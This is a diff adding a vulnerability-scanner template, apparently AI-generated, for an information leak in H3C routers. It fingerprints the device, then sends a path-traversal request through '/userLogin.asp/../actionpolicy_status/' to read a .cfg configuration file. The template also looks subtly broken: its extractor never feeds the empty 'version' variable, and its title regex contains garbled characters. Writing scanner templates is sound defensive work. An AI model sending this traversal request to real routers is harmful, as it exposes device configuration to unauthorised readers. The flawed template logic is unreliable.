@@ -1,0 +1,58 @@
+id: h3c-router-actionpolicy-status-info-leak
+info:
+  name: H3C Router ActionPolicy Status Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak, h3c-router
+
+variables:
+  version: ""
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-h3c
+    method: GET
+    path:
+      - "{{BaseURL}}/userLogin.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "H3C"
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "<title>(.*?)ϵͳ"
+
+  - id: check-leak
+    method: GET
+    path:
+      - "{{BaseURL}}/userLogin.asp/../actionpolicy_status/../{{version}}.cfg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "addr-pool-dx-addr="
+          - "$sys"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/x-unknown"
